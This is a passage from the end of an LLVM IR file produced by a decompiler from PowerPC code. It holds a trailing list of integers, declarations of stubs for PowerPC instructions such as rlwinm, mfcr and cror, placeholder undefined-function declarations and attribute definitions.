1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 1136, 1137, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 1146, 1147, 1148, 1149, 1150, 1151, 1152, 1153, 1154, 1155, 1156, 1162, 1157, 1158, 1159, 1160, 1161, 1163, 1164, 1165, 1166, 1167, 1168, 1169, 1170, 1171, 1172, 1173, 1174, 1175, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 1189, 1190, 1196, 1191, 1192, 1193, 1194, 1195, 1197, 1198, 1199, 1200, 1201, 1202, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 1211, 1212, 1213, 1214, 1215, 1216, 1217, 1218, 1219, 1220, 1221, 1222, 1223, 1224, 1225, 1226, 1227, 1228, 1229, 1230, 1231, 1232, 1233, 1234, 1235, 1236, 1237, 1238, 1239, 1240, 1241, 1242, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 1294, 1295, 1296, 1297, 1298, 1299, 1300, 1301, 1302, 1303, 1304, 1305, 1306, 1307, 1308, 1309, 1310, 1311, 1312, 1313, 1314, 1315, 1316, 1317, 1318, 1319, 1320, 1321, 1322, 1323, 1330, 1331, 1332, 1333, 1334, 1335, 1336, 1337, 1338, 1339, 1340, 1341, 1342, 1343, 1345, 1344, 1346, 1352, 1347, 1348, 1349, 1350, 1351, 1353, 1354, 1355, 1356, 1357, 1358, 1359, 1360, 1361, 1362, 1363, 1364, 1365, 1366, 1367, 1368, 1369, 1370, 1371, 1372, 1376, 1373, 1374, 1375, 27, 1377, 1378, 1379, 1381, 1380, 1382, 1383, 1384, 1385, 1386, 1387, 1388, 1389, 1390, 1391, 1392, 1393, 1394, 1395, 1396, 1397, 1398, 1399, 1401, 1400, 1402, 1408, 1403, 1404, 1405, 1406, 1407, 1409, 1410, 1411, 1412, 1413, 1414, 1415, 1416, 1417, 1418, 1419, 1420, 1421, 1422, 1423, 1424, 1425, 1426, 1427, 1428, 1429, 1430, 1461, 1462, 1463, 1464, 1465, 1466, 1467, 1468, 1469, 1470, 1471, 1472, 1473, 1474, 1475, 1476, 1477, 1478, 1479, 1480, 1481, 1490, 1491, 1492, 1493, 1494, 1495, 1496, 1497, 1498, 1499, 1500, 1501, 1502, 1503, 1504, 1505, 1506, 1507, 1508, 1509, 1681, 1682, 1683, 1684, 1685, 1686, 1687, 1688, 1689, 1690, 1691, 1692, 1693, 1694, 1707, 1708, 1709, 1710, 1711, 1712, 1713, 1714, 1715, 1720, 1721, 1722, 1723, 1726, 1727, 1746, 1747, 1748, 1754, 1755, 1757, 1758, 1759, 1760, 1761, 1762, 1763, 1764 }
}

declare i32 @__asm_rlwinm(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwimi(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwinm.(i32, i32, i32, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #0

declare i32 @__asm_mfcr() local_unnamed_addr

declare %0 @__asm_mtcrf(i32, i32) local_unnamed_addr

declare %1 @__asm_cror(i32, i32, i32) local_unnamed_addr

declare i4 @__asm_mcrf_cr0_read(i1, i1, i1, i1) local_unnamed_addr

declare %2 @__asm_crandc(i32, i32, i32) local_unnamed_addr

declare i32 @unknown_0() local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16* @__decompiler_undefined_function_1() local_unnamed_addr

declare i16 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8* @__decompiler_undefined_function_3() local_unnamed_addr

declare i8 @__decompiler_undefined_function_4() local_unnamed_addr

declare i64 @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #1

attributes #0 = { nounwind readnone }
attributes #1 = { noreturn nounwind }
